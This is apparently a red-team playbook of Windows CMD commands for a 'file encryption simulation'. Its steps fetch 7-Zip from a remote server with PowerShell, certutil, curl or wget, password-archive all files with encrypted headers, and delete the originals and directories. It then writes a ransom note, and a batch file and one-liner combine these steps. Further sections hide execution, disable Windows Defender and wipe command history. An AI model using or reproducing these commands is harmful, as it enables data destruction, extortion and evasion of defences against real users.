# Manual DOS Commands for File Encryption Simulation

**For AUTHORIZED Red Team Operations Only**

This document contains manual commands to execute the file encryption simulation from a Windows CMD shell.

---

## Prerequisites

Replace `YOUR_SERVER_IP_HERE` with your actual web server IP address hosting the 7-Zip files.

---

## Method 1: Using PowerShell from CMD

Execute these commands sequentially in CMD:

### Step 1: Download 7-Zip Executable
```cmd
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://YOUR_SERVER_IP_HERE/7z.exe', '%TEMP%\7z.exe')"
```

**Alternative using certutil:**
```cmd
certutil -urlcache -split -f "http://YOUR_SERVER_IP_HERE/7z.exe" "%TEMP%\7z.exe"
```

### Step 2: Verify Download
```cmd
dir %TEMP%\7z.exe
```

### Step 3: Create Encrypted Archive (Using Temp 7z)
```cmd
%TEMP%\7z.exe a -t7z -m0=lzma2 -mx=9 -mfb=64 -md=32m -ms=on -mhe=on -pantai "encrypted_files.7z" "*" -r -x!encrypted_files.7z -xr!*.7z
```

**Explanation of parameters:**
- `a` - Add to archive
- `-t7z` - Use 7z format
- `-m0=lzma2` - Use LZMA2 compression
- `-mx=9` - Maximum compression level
- `-mfb=64` - Fast bytes (64)
- `-md=32m` - Dictionary size (32MB)
- `-ms=on` - Solid archive mode
- `-mhe=on` - Encrypt headers (hides filenames)
- `-pantai` - Password "antai"
- `"encrypted_files.7z"` - Output archive name
- `"*"` - All files in current directory
- `-r` - Recursive (include subdirectories)
- `-x!encrypted_files.7z` - Exclude the archive itself
- `-xr!*.7z` - Exclude other 7z archives

### Step 4: Verify Archive
```cmd
%TEMP%\7z.exe t -pantai "encrypted_files.7z"
```

### Step 5: Delete Original Files
**WARNING: This permanently deletes files!**

```cmd
REM Delete all files except .7z archives
for /f "delims=" %F in ('dir /b /a-d /s ^| findstr /v /i "encrypted_files.7z"') do del /f /q "%F"
```

### Step 6: Delete Empty Directories
```cmd
for /f "delims=" %D in ('dir /b /ad /s ^| sort /r') do rd "%D" 2>nul
```

### Step 7: Create Ransom Note
```cmd
echo ============================================================================ > README_IMPORTANT.txt
echo YOUR FILES HAVE BEEN ENCRYPTED >> README_IMPORTANT.txt
echo ============================================================================ >> README_IMPORTANT.txt
echo. >> README_IMPORTANT.txt
echo All your files have been encrypted. >> README_IMPORTANT.txt
echo Archive: encrypted_files.7z >> README_IMPORTANT.txt
echo Password: antai >> README_IMPORTANT.txt
echo ============================================================================ >> README_IMPORTANT.txt
```

---

## Method 2: Using Installed 7-Zip

If 7-Zip is already installed on the system:

### Step 1: Set 7-Zip Path
```cmd
set "SEVENZIP=C:\Program Files\7-Zip\7z.exe"
```

**Or for 32-bit systems:**
```cmd
set "SEVENZIP=C:\Program Files (x86)\7-Zip\7z.exe"
```

### Step 2: Create Encrypted Archive
```cmd
"%SEVENZIP%" a -t7z -m0=lzma2 -mx=9 -mfb=64 -md=32m -ms=on -mhe=on -pantai "encrypted_files.7z" "*" -r -x!encrypted_files.7z -xr!*.7z
```

### Step 3: Verify Archive
```cmd
"%SEVENZIP%" t -pantai "encrypted_files.7z"
```

### Step 4: Delete Files (Same as Method 1)
```cmd
for /f "delims=" %F in ('dir /b /a-d /s ^| findstr /v /i "encrypted_files.7z"') do del /f /q "%F"
for /f "delims=" %D in ('dir /b /ad /s ^| sort /r') do rd "%D" 2>nul
```

---

## Method 3: Silent 7-Zip Installation

If you need to install 7-Zip silently first:

### Step 1: Download 7-Zip Installer
```cmd
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://YOUR_SERVER_IP_HERE/7z-installer.exe', '%TEMP%\7z-installer.exe')"
```

### Step 2: Install Silently (Requires Admin)
```cmd
%TEMP%\7z-installer.exe /S /D=C:\Program Files\7-Zip
```

### Step 3: Wait for Installation
```cmd
timeout /t 10 /nobreak
```

### Step 4: Proceed with encryption commands from Method 2

---

## Complete One-Liner Commands

### Download, Encrypt, and Delete (All-in-One)
```cmd
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://YOUR_SERVER_IP_HERE/7z.exe', '%TEMP%\7z.exe')" && %TEMP%\7z.exe a -t7z -mx=9 -mhe=on -pantai "encrypted_files.7z" "*" -r -x!encrypted_files.7z && for /f "delims=" %F in ('dir /b /a-d /s ^| findstr /v /i "encrypted_files.7z"') do del /f /q "%F"
```

---

## Batch File Alternative

Save this as `quick_encrypt.bat`:

```batch
@echo off
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://YOUR_SERVER_IP_HERE/7z.exe', '%TEMP%\7z.exe')"
%TEMP%\7z.exe a -t7z -mx=9 -mhe=on -pantai "encrypted_files.7z" "*" -r -x!encrypted_files.7z
for /f "delims=" %%F in ('dir /b /a-d /s ^| findstr /v /i "encrypted_files.7z"') do del /f /q "%%F"
for /f "delims=" %%D in ('dir /b /ad /s ^| sort /r') do rd "%%D" 2>nul
echo Files encrypted successfully!
echo Archive: encrypted_files.7z
echo Password: antai
pause
```

**Execute with:**
```cmd
quick_encrypt.bat
```

---

## Decryption Commands

To extract the encrypted files:

### Using Downloaded 7z.exe
```cmd
%TEMP%\7z.exe x encrypted_files.7z -pantai -o"extracted_files"
```

### Using Installed 7-Zip
```cmd
"C:\Program Files\7-Zip\7z.exe" x encrypted_files.7z -pantai -o"extracted_files"
```

**Parameters:**
- `x` - Extract with full paths
- `-pantai` - Password "antai"
- `-o"extracted_files"` - Output directory

---

## Advanced: Stealthy Execution

### Run with Hidden Window (PowerShell)
```cmd
powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c <your_command_here>' -WindowStyle Hidden"
```

### Disable Windows Defender Temporarily (Requires Admin)
```cmd
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
```

### Re-enable After Operation
```cmd
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"
```

---

## Notes

1. **Replace `YOUR_SERVER_IP_HERE`** with your actual server IP
2. **Administrative privileges** may be required for silent installation
3. **Test in isolated environment** before production use
4. **Ensure authorization** for all red team operations
5. **For loop syntax differs** between CMD and batch files:
   - CMD: Use `%F` and `%D`
   - Batch: Use `%%F` and `%%D`

---

## Troubleshooting

### If 7z.exe download fails:
```cmd
REM Try alternative download methods
curl -o %TEMP%\7z.exe http://YOUR_SERVER_IP_HERE/7z.exe
REM or
wget -O %TEMP%\7z.exe http://YOUR_SERVER_IP_HERE/7z.exe
```

### If compression is too slow:
```cmd
REM Use faster compression (lower quality)
%TEMP%\7z.exe a -t7z -mx=3 -mhe=on -pantai "encrypted_files.7z" "*" -r -x!encrypted_files.7z
```

### If archive is too large:
```cmd
REM Split into multiple volumes (100MB each)
%TEMP%\7z.exe a -t7z -mx=9 -mhe=on -pantai -v100m "encrypted_files.7z" "*" -r -x!encrypted_files.7z
```

---

## Security Considerations

- These commands leave traces in command history
- Clear command history after operation:
  ```cmd
  doskey /reinstall
  ```
- Clear PowerShell history:
  ```cmd
  powershell -Command "Clear-History; Remove-Item (Get-PSReadlineOption).HistorySavePath"
  ```

---

**END OF MANUAL COMMANDS DOCUMENTATION**
